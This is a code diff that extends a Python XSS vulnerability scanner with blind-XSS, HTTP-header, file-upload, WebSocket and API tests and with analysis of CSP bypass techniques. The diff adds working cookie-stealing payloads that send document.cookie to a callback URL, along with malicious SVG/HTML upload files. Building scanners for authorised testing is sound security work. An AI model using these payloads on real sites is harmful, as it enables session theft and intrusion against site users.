@@ -15,6 +15,10 @@ from bs4 import BeautifulSoup
 from rich.table import Table
 import threading
 import queue
+import concurrent.futures
+from functools import partial
+import websockets
+import asyncio
 
 # Import opcional do Selenium
 try:
@@ -37,13 +41,14 @@ from ..utils.network import create_session
 class XSSScanner:
     """Scanner avançado para detecção de vulnerabilidades XSS."""
 
-    def __init__(self, base_url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False):
+    def __init__(self, base_url, custom_payloads_file=None, scan_stored=False, fuzz_dom=False, blind_xss_callback=None):
         self.base_url = base_url
         self.session = create_session()
         self.vulnerable_points = []
         self.payloads = self._load_payloads(custom_payloads_file)
         self.scan_stored = scan_stored
         self.fuzz_dom = fuzz_dom
+        self.blind_xss_callback = blind_xss_callback  # URL para receber callbacks de blind XSS
         
         # Configurações avançadas inspiradas no DALFOX
         self.enable_bypasses = True
@@ -58,6 +63,15 @@ class XSSScanner:
         self.waf_fingerprint = True
         self.encoding_variations = True
         self.show_immediate_findings = False  # Controla se mostra achados durante o progresso
+        self.test_headers = True  # Testa XSS em headers HTTP
+        self.test_file_upload = True  # Testa XSS via file upload
+        self.parallel_testing = True  # Ativa testes paralelos
+        self.max_workers = 5  # Número máximo de threads paralelas
+        self.results_lock = threading.Lock()  # Lock para thread safety
+        
+        # Sistema de cache para evitar testes duplicados
+        self.tested_parameters = set()  # Cache de parâmetros já testados
+        self.false_positive_cache = set()  # Cache de falsos positivos conhecidos
         
         # Estatísticas de scan
         self.stats = {
@@ -186,6 +200,30 @@ class XSSScanner:
                 "<link rel=stylesheet href=data:,*{xss:expression(alert('csp-bypass-spectra'))}>",
                 "<script>eval(location.hash.slice(1))</script>#alert('csp-bypass-spectra')",
                 "<iframe src=javascript:parent.alert('csp-bypass-spectra')>",
+            ],
+            
+            # Payloads para Blind XSS
+            'blind_xss': [
+                "<script>var i=new Image();i.src='CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie;</script>",
+                "<img src=x onerror='var i=new Image();i.src=\"CALLBACK_URL?blind_xss=\"+document.domain+\"&cookie=\"+document.cookie;'>",
+                "<svg onload='var i=new Image();i.src=\"CALLBACK_URL?blind_xss=\"+document.domain+\"&cookie=\"+document.cookie;'>",
+                "<iframe src='javascript:var i=new Image();i.src=\"CALLBACK_URL?blind_xss=\"+document.domain+\"&cookie=\"+document.cookie;'></iframe>",
+                "<script>fetch('CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie)</script>",
+                "<script>navigator.sendBeacon('CALLBACK_URL','blind_xss='+document.domain+'&cookie='+document.cookie)</script>",
+                "<script>document.location='CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie</script>",
+                "<script>var x=new XMLHttpRequest();x.open('GET','CALLBACK_URL?blind_xss='+document.domain+'&cookie='+document.cookie);x.send()</script>",
+            ],
+            
+            # Payloads para HTTP Headers
+            'header_xss': [
+                "<script>alert('header-xss-spectra')</script>",
+                "\"'><script>alert('header-xss-spectra')</script>",
+                "<img src=x onerror=alert('header-xss-spectra')>",
+                "<svg onload=alert('header-xss-spectra')>",
+                "javascript:alert('header-xss-spectra')",
+                "';alert('header-xss-spectra');//",
+                "\";alert('header-xss-spectra');//",
+                "</script><script>alert('header-xss-spectra')</script>",
             ]
         }
 
@@ -260,12 +298,12 @@ class XSSScanner:
         return contexts
 
     def _analyze_csp(self, response):
-        """Analisa Content Security Policy com detalhes avançados."""
+        """Analisa Content Security Policy com detalhes avançados e técnicas de bypass."""
         csp_header = response.headers.get('Content-Security-Policy', '')
         csp_report_only = response.headers.get('Content-Security-Policy-Report-Only', '')
         
         if not csp_header and not csp_report_only:
-            return {'present': False}
+            return {'present': False, 'allows_inline_script': True}
         
         # Usa CSP principal ou report-only
         active_csp = csp_header if csp_header else csp_report_only
@@ -278,7 +316,9 @@ class XSSScanner:
             'report_only': is_report_only,
             'directives': {},
             'bypasses': [],
-            'risk_level': 'Low'
+            'risk_level': 'Low',
+            'allows_inline_script': False,
+            'bypass_techniques': []
         }
         
         # Extrai diretivas
@@ -295,27 +335,57 @@ class XSSScanner:
         if script_src:
             if "'unsafe-inline'" in script_src:
                 csp_analysis['bypasses'].append("'unsafe-inline' permite scripts inline")
+                csp_analysis['allows_inline_script'] = True
                 csp_analysis['risk_level'] = 'High'
+                csp_analysis['bypass_techniques'].append("Usar <script>alert(1)</script>")
+                
             if "'unsafe-eval'" in script_src:
                 csp_analysis['bypasses'].append("'unsafe-eval' permite eval()")
                 csp_analysis['risk_level'] = 'High'
+                csp_analysis['bypass_techniques'].append("Usar eval() ou Function() constructor")
+                
             if 'data:' in script_src:
                 csp_analysis['bypasses'].append("data: URIs permitidos")
                 csp_analysis['risk_level'] = 'Medium'
+                csp_analysis['bypass_techniques'].append("Usar <script src=data:text/javascript,alert(1)>")
+                
             if '*' in script_src:
                 csp_analysis['bypasses'].append("Wildcard (*) permite qualquer origem")
                 csp_analysis['risk_level'] = 'High'
+                csp_analysis['bypass_techniques'].append("Hospedar script malicioso em qualquer domínio")
+                
             if 'http:' in script_src:
                 csp_analysis['bypasses'].append("HTTP permitido (inseguro)")
                 csp_analysis['risk_level'] = 'Medium'
+                csp_analysis['bypass_techniques'].append("MITM para injetar scripts via HTTP")
+                
+            # Verifica domínios específicos vulneráveis
+            vulnerable_domains = [
+                'googleapis.com', 'google.com', 'gstatic.com', 'jsdelivr.net',
+                'unpkg.com', 'cdnjs.cloudflare.com', 'ajax.googleapis.com'
+            ]
+            for domain in vulnerable_domains:
+                if domain in script_src:
+                    csp_analysis['bypasses'].append(f"Domínio vulnerável permitido: {domain}")
+                    if csp_analysis['risk_level'] == 'Low':
+                        csp_analysis['risk_level'] = 'Medium'
+                    csp_analysis['bypass_techniques'].append(f"Usar JSONP callback ou vulnerabilidade em {domain}")
+                    
+            # Verifica nonces mal implementados
+            if 'nonce-' in script_src:
+                csp_analysis['bypasses'].append("Nonce detectado - verificar reutilização")
+                csp_analysis['bypass_techniques'].append("Reutilizar nonce ou injetar em contexto com nonce")
+                
         else:
             csp_analysis['bypasses'].append("Nenhuma restrição script-src")
+            csp_analysis['allows_inline_script'] = True
             csp_analysis['risk_level'] = 'High'
         
         # Verifica object-src
         object_src = directives.get('object-src', '')
         if object_src != "'none'":
             csp_analysis['bypasses'].append("object-src não restrito adequadamente")
+            csp_analysis['bypass_techniques'].append("Usar <object> ou <embed> para bypass")
             if csp_analysis['risk_level'] == 'Low':
                 csp_analysis['risk_level'] = 'Medium'
         
@@ -323,42 +393,158 @@ class XSSScanner:
         base_uri = directives.get('base-uri', '')
         if not base_uri or base_uri != "'self'":
             csp_analysis['bypasses'].append("base-uri não restrito")
+            csp_analysis['bypass_techniques'].append("Injetar <base> tag para redirecionamento")
             if csp_analysis['risk_level'] == 'Low':
                 csp_analysis['risk_level'] = 'Medium'
+                
+        # Verifica frame-ancestors
+        frame_ancestors = directives.get('frame-ancestors', '')
+        if not frame_ancestors:
+            csp_analysis['bypasses'].append("frame-ancestors não definido (permite clickjacking)")
+            
+        # Verifica form-action
+        form_action = directives.get('form-action', '')
+        if not form_action:
+            csp_analysis['bypasses'].append("form-action não restrito")
+            
+        # Verifica connect-src para WebSocket bypass
+        connect_src = directives.get('connect-src', '')
+        if not connect_src or '*' in connect_src:
+            csp_analysis['bypasses'].append("connect-src permite conexões externas")
+            csp_analysis['bypass_techniques'].append("Usar WebSocket ou XMLHttpRequest para exfiltração")
+            
+        # Verifica worker-src para Web Workers
+        worker_src = directives.get('worker-src', directives.get('script-src', ''))
+        if 'data:' in worker_src or '*' in worker_src:
+            csp_analysis['bypasses'].append("worker-src permite Web Workers externos")
+            csp_analysis['bypass_techniques'].append("Usar Web Workers para bypass")
+            
+        # Verifica style-src para CSS injection
+        style_src = directives.get('style-src', directives.get('default-src', ''))
+        if "'unsafe-inline'" in style_src:
+            csp_analysis['bypasses'].append("'unsafe-inline' em style-src permite CSS injection")
+            csp_analysis['bypass_techniques'].append("CSS injection com expression() ou data URIs")
         
         return csp_analysis
 
-    def _add_finding(self, risk, v_type, detail, recommendation):
-        """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado. Suporte a modo verbose."""
-        is_new_finding = True
+    def _is_false_positive(self, payload, response_text, url):
+        """Verifica se a detecção é um falso positivo."""
+        # Cria chave única para cache
+        cache_key = f"{url}:{payload[:50]}"
         
-        # Verifica se uma descoberta para este 'detalhe' já existe
-        for i, finding in enumerate(self.vulnerable_points):
-            if finding["Detalhe"] == detail:
-                is_new_finding = False
-                # Se a nova descoberta for "Armazenado" e a existente não for, atualiza-a.
-                if v_type == "XSS Armazenado" and finding["Tipo"] != "XSS Armazenado":
-                    self.vulnerable_points[i].update({
-                        "Risco": "Alto",
-                        "Tipo": "XSS Armazenado",
-                        "Recomendação": recommendation
-                    })
-                    # Notificação verbose para upgrade de vulnerabilidade
-                    if self.verbose:
-                        print_warning(f"Vulnerabilidade atualizada para [bold red]XSS Armazenado[/bold red]: [cyan]{detail.split(' em ')[0] if ' em ' in detail else detail[:50]}[/cyan]")
-                return  # Evita adicionar uma duplicada
+        if cache_key in self.false_positive_cache:
+            return True
+        
+        # Verifica padrões de falsos positivos comuns
+        false_positive_patterns = [
+            # Payload refletido em comentários HTML
+            rf'<!--.*?{re.escape(payload)}.*?-->',
+            # Payload refletido em scripts de erro/debug
+            rf'error.*?{re.escape(payload)}.*?stack',
+            rf'debug.*?{re.escape(payload)}.*?trace',
+            # Payload refletido em JSON sem execução
+            rf'".*?{re.escape(payload)}.*?":\s*"',
+            # Payload refletido em atributos de data
+            rf'data-.*?=.*?{re.escape(payload)}',
+            # Payload refletido em URLs sem contexto de execução
+            rf'href.*?=.*?{re.escape(payload)}.*?rel=',
+            # Payload refletido em inputs hidden/disabled
+            rf'<input[^>]*disabled[^>]*value.*?{re.escape(payload)}',
+            rf'<input[^>]*type=["\']*hidden[^>]*value.*?{re.escape(payload)}',
+        ]
+        
+        for pattern in false_positive_patterns:
+            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
+                # Adiciona ao cache de falsos positivos
+                self.false_positive_cache.add(cache_key)
+                return True
+        
+        # Verifica se payload está em contexto não executável
+        non_executable_contexts = [
+            'title', 'meta', 'link', 'noscript', 'noframes'
+        ]
+        
+        for context in non_executable_contexts:
+            pattern = rf'<{context}[^>]*>.*?{re.escape(payload)}.*?</{context}>'
+            if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
+                self.false_positive_cache.add(cache_key)
+                return True
+        
+        return False
 
-        # Se não houver correspondência, adiciona a nova descoberta
-        if is_new_finding:
-            self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})
-            self.stats['vulnerabilities_found'] = len(self.vulnerable_points)
+    def _is_parameter_already_tested(self, method, url, param):
+        """Verifica se o parâmetro já foi testado."""
+        test_key = f"{method.upper()}:{url}:{param}"
+        
+        if test_key in self.tested_parameters:
+            return True
+        
+        # Adiciona ao cache
+        self.tested_parameters.add(test_key)
+        return False
+
+    def _validate_xss_execution(self, payload, response_text):
+        """Valida se o XSS realmente pode ser executado."""
+        validation_score = 0
+        
+        # Verifica se está em contexto executável
+        executable_contexts = [
+            r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>',
+            r'on\w+\s*=\s*[\'"][^\'\"]*' + re.escape(payload),
+            r'href\s*=\s*[\'"]javascript:.*?' + re.escape(payload),
+            r'src\s*=\s*[\'"]javascript:.*?' + re.escape(payload),
+        ]
+        
+        for context in executable_contexts:
+            if re.search(context, response_text, re.IGNORECASE):
+                validation_score += 3
+                
+        # Verifica se está em HTML text (potencialmente executável)
+        if re.search(rf'>[^<]*{re.escape(payload)}[^<]*<', response_text):
+            validation_score += 2
             
-            # Notificação verbose para nova vulnerabilidade
-            if self.verbose:
-                param_name = detail.split("'")[1] if "'" in detail else detail.split(' em ')[0] if ' em ' in detail else detail[:50]
-                risk_color = 'red' if risk == 'Alto' else 'yellow' if risk == 'Médio' else 'cyan'
-                type_color = 'red' if 'Armazenado' in v_type else 'yellow' if 'DOM' in v_type else 'green'
-                print_success(f"[{risk_color}]{risk}[/{risk_color}] - [{type_color}]{v_type}[/{type_color}] em [cyan]{param_name}[/cyan]")
+        # Verifica se está em atributo (moderadamente executável)
+        if re.search(rf'\w+\s*=\s*[\'"][^\'\"]*{re.escape(payload)}', response_text):
+            validation_score += 1
+            
+        # Verifica encodings que podem impedir execução
+        if any(enc in payload for enc in ['&lt;', '&gt;', '&quot;', '&#']):
+            validation_score -= 2
+            
+        return validation_score >= 2
+
+    def _add_finding(self, risk, v_type, detail, recommendation):
+        """Adiciona ou atualiza uma descoberta, priorizando XSS Armazenado. Thread-safe."""
+        with self.results_lock:
+            is_new_finding = True
+            
+            # Verifica se uma descoberta para este 'detalhe' já existe
+            for i, finding in enumerate(self.vulnerable_points):
+                if finding["Detalhe"] == detail:
+                    is_new_finding = False
+                    # Se a nova descoberta for "Armazenado" e a existente não for, atualiza-a.
+                    if v_type == "XSS Armazenado" and finding["Tipo"] != "XSS Armazenado":
+                        self.vulnerable_points[i].update({
+                            "Risco": "Alto",
+                            "Tipo": "XSS Armazenado",
+                            "Recomendação": recommendation
+                        })
+                        # Notificação verbose para upgrade de vulnerabilidade
+                        if self.verbose:
+                            print_warning(f"Vulnerabilidade atualizada para [bold red]XSS Armazenado[/bold red]: [cyan]{detail.split(' em ')[0] if ' em ' in detail else detail[:50]}[/cyan]")
+                    return  # Evita adicionar uma duplicada
+
+            # Se não houver correspondência, adiciona a nova descoberta
+            if is_new_finding:
+                self.vulnerable_points.append({"Risco": risk, "Tipo": v_type, "Detalhe": detail, "Recomendação": recommendation})
+                self.stats['vulnerabilities_found'] = len(self.vulnerable_points)
+                
+                # Notificação verbose para nova vulnerabilidade
+                if self.verbose:
+                    param_name = detail.split("'")[1] if "'" in detail else detail.split(' em ')[0] if ' em ' in detail else detail[:50]
+                    risk_color = 'red' if risk == 'Alto' else 'yellow' if risk == 'Médio' else 'cyan'
+                    type_color = 'red' if 'Armazenado' in v_type else 'yellow' if 'DOM' in v_type else 'green'
+                    print_success(f"[{risk_color}]{risk}[/{risk_color}] - [{type_color}]{v_type}[/{type_color}] em [cyan]{param_name}[/cyan]")
     
     def _update_progress_with_vulns(self, progress, task_id, param_name):
         """Atualiza a descrição da barra de progresso com o número de vulnerabilidades encontradas de forma discreta."""
@@ -369,6 +555,154 @@ class XSSScanner:
             vuln_text = f"[green]Testando [cyan]{param_name}[/cyan]"
         
         progress.update(task_id, description=vuln_text)
+
+    def _test_parameter_parallel(self, method, url, param, form_data, waf_info, payloads):
+        """Testa um parâmetro específico de forma thread-safe."""
+        results = []
+        
+        # Primeiro, testa com payload de análise de contexto
+        test_payload = "xss-context-test-spectra-12345"
+        test_data = {param: test_payload}
+        
+        try:
+            if method.lower() == 'get':
+                response = self.session.get(url, params=test_data, timeout=7, verify=False)
+            else:
+                post_payload = (form_data or {}).copy()
+                post_payload[param] = test_payload
+                response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+            
+            with self.results_lock:
+                self.stats['total_requests'] += 1
+            
+            if test_payload in response.text:
+                with self.results_lock:
+                    self.stats['reflected_params'] += 1
+                
+                # Análise de contexto
+                contexts = self._detect_context(response.text, test_payload)
+                csp_info = self._analyze_csp(response)
+                
+                # Seleciona payloads baseados no contexto
+                selected_payloads = payloads[:8]  # Limite para paralelização
+                if 'attribute' in contexts:
+                    selected_payloads.extend(self._get_default_payloads()['attribute'][:2])
+                if waf_info.get('detected'):
+                    selected_payloads.extend(self._get_default_payloads()['waf_bypass'][:2])
+                
+                # Testa payloads selecionados
+                for payload in selected_payloads:
+                    variant_test_data = {param: payload}
+                    
+                    try:
+                        if method.lower() == 'get':
+                            variant_response = self.session.get(url, params=variant_test_data, timeout=7, verify=False)
+                        else:
+                            post_variant = (form_data or {}).copy()
+                            post_variant[param] = payload
+                            variant_response = self.session.post(url, data=post_variant, timeout=7, verify=False)
+                        
+                        with self.results_lock:
+                            self.stats['total_requests'] += 1
+                        
+                        if payload in variant_response.text:
+                            # Verifica se é falso positivo
+                            if self._is_false_positive(payload, variant_response.text, url):
+                                continue
+                            
+                            # Valida se XSS pode realmente ser executado
+                            if not self._validate_xss_execution(payload, variant_response.text):
+                                continue
+                            
+                            # Calcula risco
+                            risk_score = 0
+                            if 'script' in contexts or 'event_handler' in contexts:
+                                risk_score += 3
+                            elif 'html_text' in contexts:
+                                risk_score += 2
+                            elif 'attribute' in contexts:
+                                risk_score += 1
+                            
+                            if not csp_info.get('present'):
+                                risk_score += 2
+                            elif csp_info.get('report_only'):
+                                risk_score += 1
+                            
+                            risk = "Alto" if risk_score >= 5 else "Médio" if risk_score >= 3 else "Baixo"
+                            
+                            detail = f"Parâmetro '{param}' em {url} ({method.upper()})"
+                            context_str = ', '.join(contexts) if contexts else 'Desconhecido'
+                            rec = f"Payload '{payload}' refletido no contexto: {context_str}. Validação de execução confirmada."
+                            
+                            results.append({
+                                'risk': risk,
+                                'type': 'XSS Refletido',
+                                'detail': detail,
+                                'recommendation': rec
+                            })
+                            break
+                            
+                    except requests.RequestException:
+                        continue
+                        
+        except requests.RequestException:
+            pass
+            
+        return results
+
+    def _scan_reflected_parallel(self, tasks, progress, waf_info):
+        """Executa o scan de XSS Refletido usando processamento paralelo."""
+        if not self.parallel_testing or len(tasks) < 3:
+            # Para poucos parâmetros, usa método sequencial
+            return self._scan_reflected_advanced(tasks, progress, waf_info)
+            
+        task_id = progress.add_task("[green]Scan XSS Refletido Paralelo...", total=len(tasks))
+        
+        # Seleciona payloads base
+        all_payloads_dict = self._get_default_payloads()
+        base_payloads = []
+        base_payloads.extend(all_payloads_dict['basic'][:3])
+        base_payloads.extend(all_payloads_dict['polyglot'][:2])
+        
+        # Cria função parcial para facilitar o uso com ThreadPoolExecutor
+        test_func = partial(
+            self._test_parameter_parallel,
+            waf_info=waf_info,
+            payloads=base_payloads
+        )
+        
+        # Executa testes em paralelo
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            # Submete tarefas
+            future_to_task = {}
+            for method, url, param, form_data in tasks:
+                future = executor.submit(test_func, method, url, param, form_data)
+                future_to_task[future] = (method, url, param, form_data)
+            
+            # Coleta resultados conforme completam
+            for future in concurrent.futures.as_completed(future_to_task):
+                method, url, param, form_data = future_to_task[future]
+                
+                try:
+                    results = future.result(timeout=30)  # Timeout de 30s por parâmetro
+                    
+                    # Adiciona findings encontrados
+                    for result in results:
+                        self._add_finding(
+                            result['risk'],
+                            result['type'], 
+                            result['detail'],
+                            result['recommendation']
+                        )
+                        
+                except (concurrent.futures.TimeoutError, Exception) as e:
+                    if self.verbose:
+                        print_warning(f"Erro testando parâmetro [cyan]{param}[/cyan]: {str(e)[:50]}")
+                
+                # Atualiza progresso
+                progress.update(task_id, advance=1)
+                
+        progress.remove_task(task_id)
 
     def _scan_reflected(self, tasks, progress):
         """Executa o scan para XSS Refletido."""
@@ -856,6 +1190,466 @@ class XSSScanner:
             
         return False
 
+    def _scan_blind_xss(self, tasks, progress):
+        """Executa scan específico para Blind XSS."""
+        if not self.blind_xss_callback:
+            return
+            
+        task_id = progress.add_task("[red]Scan Blind XSS...", total=len(tasks))
+        
+        # Payloads de Blind XSS com callback URL
+        blind_payloads = []
+        for payload in self._get_default_payloads()['blind_xss']:
+            blind_payloads.append(payload.replace('CALLBACK_URL', self.blind_xss_callback))
+        
+        for method, url, param, form_data in tasks:
+            # Verifica se parâmetro já foi testado
+            if self._is_parameter_already_tested(method, url, param):
+                progress.update(task_id, advance=1)
+                continue
+                
+            # Atualiza progresso de forma limpa
+            self._update_progress_with_vulns(progress, task_id, param)
+            progress.update(task_id, advance=1)
+            
+            for payload in blind_payloads[:5]:  # Limite para performance
+                test_data = {param: payload}
+                
+                try:
+                    if method.lower() == 'get':
+                        response = self.session.get(url, params=test_data, timeout=7, verify=False)
+                    else:
+                        post_payload = (form_data or {}).copy()
+                        post_payload[param] = payload
+                        response = self.session.post(url, data=post_payload, timeout=7, verify=False)
+                    
+                    self.stats['total_requests'] += 1
+                    
+                    # Log verbose para Blind XSS submetido
+                    if self.verbose:
+                        print_info(f"Blind XSS payload submetido em [cyan]{param}[/cyan]: [yellow]{payload[:50]}[/yellow]")
+                    
+                    # Para Blind XSS, não há verificação imediata - depende do callback
+                    detail = f"Blind XSS payload submetido no parâmetro '{param}' em {url} ({method.upper()})"
+                    rec = f"Payload Blind XSS '{payload[:100]}' foi submetido. Verifique o callback URL {self.blind_xss_callback} para confirmação de execução."
+                    
+                    # Marca como suspeito, não confirmado
+                    self._add_finding("Médio", "Blind XSS (Suspeito)", detail, rec)
+                    
+                except requests.RequestException:
+                    continue
+        
+        progress.remove_task(task_id)
+
+    def _scan_header_xss(self, base_url, progress):
+        """Executa scan específico para XSS em headers HTTP."""
+        if not self.test_headers:
+            return
+            
+        # Headers comuns para testar XSS
+        test_headers = [
+            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP', 
+            'X-Originating-IP', 'X-Remote-IP', 'X-Remote-Addr',
+            'CF-Connecting-IP', 'True-Client-IP', 'X-Client-IP',
+            'X-Forwarded-Host', 'X-Host', 'Origin', 'Accept-Language',
+            'Accept-Encoding', 'Accept', 'Cookie', 'Authorization'
+        ]
+        
+        task_id = progress.add_task("[yellow]Scan Header XSS...", total=len(test_headers))
+        
+        header_payloads = self._get_default_payloads()['header_xss']
+        
+        for header_name in test_headers:
+            # Atualiza progresso
+            progress.update(task_id, advance=1, description=f"[yellow]Testando header [cyan]{header_name}[/cyan]...")
+            
+            for payload in header_payloads[:3]:  # Limite para performance
+                headers = {header_name: payload}
+                
+                try:
+                    response = self.session.get(base_url, headers=headers, timeout=7, verify=False)
+                    self.stats['total_requests'] += 1
+                    
+                    # Verifica se o payload foi refletido na resposta
+                    if payload in response.text:
+                        # Log verbose para header XSS detectado
+                        if self.verbose:
+                            print_warning(f"Header XSS detectado em [cyan]{header_name}[/cyan]: [yellow]{payload[:30]}[/yellow]")
+                        
+                        detail = f"XSS no header '{header_name}' refletido na resposta"
+                        rec = f"Payload '{payload}' no header {header_name} foi refletido na página. Verificar execução manual."
+                        
+                        # Análise de contexto no header
+                        contexts = self._detect_context(response.text, payload)
+                        risk = "Alto" if any(ctx in ['script', 'event_handler', 'html_text'] for ctx in contexts) else "Médio"
+                        
+                        self._add_finding(risk, "XSS em Header HTTP", detail, rec)
+                        break  # Para no primeiro sucesso por header
+                        
+                except requests.RequestException:
+                    continue
+        
+        progress.remove_task(task_id)
+
+    def _scan_file_upload_xss(self, forms, progress):
+        """Executa scan específico para XSS via File Upload."""
+        if not self.test_file_upload:
+            return
+            
+        # Procura formulários com file upload
+        upload_forms = []
+        for form in forms:
+            if form.find('input', {'type': 'file'}):
+                upload_forms.append(form)
+        
+        if not upload_forms:
+            return
+            
+        task_id = progress.add_task("[magenta]Scan File Upload XSS...", total=len(upload_forms))
+        
+        for form in upload_forms:
+            action = urljoin(self.base_url, form.get('action', '')) if form.get('action') else self.base_url
+            method = form.get('method', 'post').lower()
+            
+            progress.update(task_id, advance=1, description=f"[magenta]Testando upload em [cyan]{action}[/cyan]...")
+            
+            if method != 'post':
+                continue
+            
+            # Prepara dados base do formulário
+            base_data = {}
+            for hidden_field in form.find_all('input', {'type': 'hidden'}):
+                if hidden_field.get('name'):
+                    base_data[hidden_field['name']] = hidden_field.get('value', '')
+            
+            # Testa diferentes tipos de arquivo maliciosos
+            malicious_files = [
+                {
+                    'filename': 'xss.svg',
+                    'content': '<svg onload="alert(\'svg-xss-spectra\')" xmlns="http://www.w3.org/2000/svg"><text>XSS</text></svg>',
+                    'content_type': 'image/svg+xml'
+                },
+                {
+                    'filename': 'xss.html',
+                    'content': '<script>alert("html-xss-spectra")</script>',
+                    'content_type': 'text/html'
+                },
+                {
+                    'filename': 'xss.xml',
+                    'content': '<?xml version="1.0"?><root><script>alert("xml-xss-spectra")</script></root>',
+                    'content_type': 'application/xml'
+                }
+            ]
+            
+            file_input = form.find('input', {'type': 'file'})
+            if not file_input or not file_input.get('name'):
+                continue
+                
+            field_name = file_input['name']
+            
+            for file_data in malicious_files:
+                try:
+                    files = {field_name: (file_data['filename'], file_data['content'], file_data['content_type'])}
+                    
+                    response = self.session.post(action, data=base_data, files=files, timeout=10, verify=False)
+                    self.stats['total_requests'] += 1
+                    
+                    # Verifica se o conteúdo malicioso foi refletido
+                    if 'xss-spectra' in response.text:
+                        # Log verbose para file upload XSS detectado
+                        if self.verbose:
+                            print_warning(f"File Upload XSS detectado: [cyan]{file_data['filename']}[/cyan]")
+                        
+                        detail = f"XSS via upload do arquivo '{file_data['filename']}' no formulário {action}"
+                        rec = f"Arquivo malicioso '{file_data['filename']}' foi aceito e seu conteúdo refletido na aplicação."
+                        
+                        self._add_finding("Alto", "XSS via File Upload", detail, rec)
+                        
+                except requests.RequestException:
+                    continue
+        
+        progress.remove_task(task_id)
+
+    def _scan_websocket_xss(self, base_url, progress):
+        """Executa scan específico para XSS em WebSockets."""
+        # Converte HTTP(S) para WS(S)
+        ws_url = base_url.replace('http://', 'ws://').replace('https://', 'wss://')
+        
+        # URLs comuns de WebSocket para testar
+        ws_endpoints = [
+            f"{ws_url}/ws",
+            f"{ws_url}/websocket", 
+            f"{ws_url}/socket.io/",
+            f"{ws_url}/chat",
+            f"{ws_url}/live",
+            f"{ws_url}/api/ws"
+        ]
+        
+        task_id = progress.add_task("[purple]Scan WebSocket XSS...", total=len(ws_endpoints))
+        
+        websocket_payloads = [
+            '{"message":"<script>alert(\'ws-xss-spectra\')</script>"}',
+            '{"data":"<img src=x onerror=alert(\'ws-xss-spectra\')>"}',
+            '{"content":"<svg onload=alert(\'ws-xss-spectra\')>"}',
+            '{"text":"\\u003cscript\\u003ealert(\\"ws-xss-spectra\\")\\u003c/script\\u003e"}',
+            '{"msg":"<iframe src=javascript:alert(\'ws-xss-spectra\')></iframe>"}'
+        ]
+        
+        for ws_endpoint in ws_endpoints:
+            progress.update(task_id, advance=1, description=f"[purple]Testando WebSocket [cyan]{ws_endpoint}[/cyan]...")
+            
+            try:
+                # Tenta conectar ao WebSocket
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                
+                async def test_websocket():
+                    try:
+                        async with websockets.connect(ws_endpoint, timeout=5) as websocket:
+                            for payload in websocket_payloads[:3]:
+                                await websocket.send(payload)
+                                
+                                # Tenta receber resposta
+                                try:
+                                    response = await asyncio.wait_for(websocket.recv(), timeout=2)
+                                    
+                                    # Verifica se o payload foi refletido
+                                    if 'xss-spectra' in response:
+                                        detail = f"WebSocket XSS em {ws_endpoint}"
+                                        rec = f"Payload '{payload}' foi refletido na resposta do WebSocket."
+                                        
+                                        with self.results_lock:
+                                            self.stats['total_requests'] += 1
+                                        
+                                        if self.verbose:
+                                            print_warning(f"WebSocket XSS detectado em [cyan]{ws_endpoint}[/cyan]")
+                                        
+                                        self._add_finding("Alto", "WebSocket XSS", detail, rec)
+                                        return True
+                                        
+                                except asyncio.TimeoutError:
+                                    continue
+                                    
+                    except Exception:
+                        return False
+                    return False
+                
+                # Executa teste assíncrono
+                if loop.run_until_complete(test_websocket()):
+                    break
+                    
+            except Exception:
+                continue
+            finally:
+                loop.close()
+        
+        progress.remove_task(task_id)
+
+    def _scan_api_json_xss(self, base_url, progress):
+        """Executa scan específico para XSS em APIs/JSON endpoints."""
+        # Endpoints comuns de API para testar
+        api_endpoints = [
+            f"{base_url}/api/",
+            f"{base_url}/api/v1/",
+            f"{base_url}/api/v2/",
+            f"{base_url}/rest/",
+            f"{base_url}/graphql",
+            f"{base_url}/json",
+            f"{base_url}/ajax",
+            f"{base_url}/api/search",
+            f"{base_url}/api/users",
+            f"{base_url}/api/data"
+        ]
+        
+        task_id = progress.add_task("[cyan]Scan API/JSON XSS...", total=len(api_endpoints))
+        
+        # Payloads para APIs/JSON
+        json_payloads = [
+            '{"query":"<script>alert(\\"api-xss-spectra\\")</script>"}',
+            '{"search":"<img src=x onerror=alert(\\"api-xss-spectra\\")>"}',
+            '{"data":"<svg onload=alert(\\"api-xss-spectra\\")>"}',
+            '{"input":"\\u003cscript\\u003ealert(\\"api-xss-spectra\\")\\u003c/script\\u003e"}',
+            '{"message":"<iframe src=javascript:alert(\\"api-xss-spectra\\")></iframe>"}'
+        ]
+        
+        for endpoint in api_endpoints:
+            progress.update(task_id, advance=1, description=f"[cyan]Testando API [cyan]{endpoint}[/cyan]...")
+            
+            for payload in json_payloads[:3]:  # Limita payloads
+                try:
+                    # Headers para APIs
+                    headers = {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                    
+                    # Testa POST JSON
+                    response = self.session.post(endpoint, data=payload, headers=headers, timeout=7, verify=False)
+                    self.stats['total_requests'] += 1
+                    
+                    # Verifica se o payload foi refletido na resposta
+                    if 'api-xss-spectra' in response.text:
+                        detail = f"API/JSON XSS em {endpoint}"
+                        rec = f"Payload JSON '{payload}' foi refletido na resposta da API."
+                        
+                        if self.verbose:
+                            print_warning(f"API/JSON XSS detectado em [cyan]{endpoint}[/cyan]")
+                        
+                        self._add_finding("Alto", "API/JSON XSS", detail, rec)
+                        break
+                    
+                    # Testa também GET com parâmetros JSON
+                    try:
+                        import json
+                        payload_dict = json.loads(payload)
+                        response = self.session.get(endpoint, params=payload_dict, timeout=7, verify=False)
+                        self.stats['total_requests'] += 1
+                        
+                        if 'api-xss-spectra' in response.text:
+                            detail = f"API GET XSS em {endpoint}"
+                            rec = f"Parâmetros JSON refletidos na resposta da API via GET."
+                            
+                            self._add_finding("Médio", "API GET XSS", detail, rec)
+                            break
+                            
